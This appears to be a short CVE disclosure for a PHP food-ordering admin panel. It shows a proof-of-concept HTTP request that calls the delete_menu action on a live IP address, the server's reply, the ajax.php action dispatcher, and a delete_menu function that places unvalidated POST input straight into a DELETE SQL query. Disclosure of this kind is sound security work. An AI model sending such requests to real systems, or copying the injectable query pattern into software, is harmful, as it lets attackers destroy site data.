# CVEs
CVE Repository
# Lucca Magalhães and Paul Lannes

##request
```
POST /admin/ajax.php?action=delete_menu HTTP/1.1
Host: 146.190.137.51
Content-Length: 4
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://146.190.137.51
Referer: http://146.190.137.51/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=5jad5scvllisg7uliftluuudev
Connection: close

id=3
```


##response
```
HTTP/1.1 200 OK
Date: Fri, 17 Feb 2023 19:19:45 GMT
Server: Apache/2.4.54 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 1
Connection: close
Content-Type: text/html; charset=UTF-8

1
```



###Functions Ajax.php

```
<?php
ob_start();
$action = $_GET['action'];
include 'admin_class.php';
$crud = new Action();

if($action == 'login'){
        $login = $crud->login();
        if($login)
                echo $login;
}
if($action == 'login2'){
        $login = $crud->login2();
        if($login)
                echo $login;
}
if($action == 'logout'){
        $logout = $crud->logout();
        if($logout)
                echo $logout;
}
if($action == 'logout2'){
        $logout = $crud->logout2();
        if($logout)
                echo $logout;
}
if($action == 'save_user'){
        $save = $crud->save_user();
        if($save)
                echo $save;
}
if($action == 'signup'){
        $save = $crud->signup();
        if($save)
                echo $save;
}
if($action == "save_settings"){
        $save = $crud->save_settings();
        if($save)
                echo $save;
}
if($action == "save_category"){
        $save = $crud->save_category();
        if($save)
                echo $save;
}
if($action == "delete_category"){
        $save = $crud->delete_category();
        if($save)
                echo $save;
}
if($action == "save_menu"){
        $save = $crud->save_menu();
        if($save)
                echo $save;
}
if($action == "delete_menu"){
        $save = $crud->delete_menu();
        if($save)
                echo $save;
}
if($action == "add_to_cart"){
        $save = $crud->add_to_cart();
        if($save)
                echo $save;
}
if($action == "get_cart_count"){
        $save = $crud->get_cart_count();
        if($save)
                echo $save;
}
if($action == "delete_cart"){
        $delete = $crud->delete_cart();
        if($delete)
                echo $delete;
}
if($action == "update_cart_qty"){
        $save = $crud->update_cart_qty();
        if($save)
                echo $save;
}
if($action == "save_order"){
        $save = $crud->save_order();
        if($save)
                echo $save;
}

if($action == "confirm_order"){
        $save = $crud->confirm_order();
        if($save)
                echo $save;
}

```


##and the vulnerable functions without any validator step
```
        function delete_menu(){
                extract($_POST);
                $delete = $this->db->query("DELETE FROM product_list where id = ".$id);
                if($delete)
                        return 1;
```
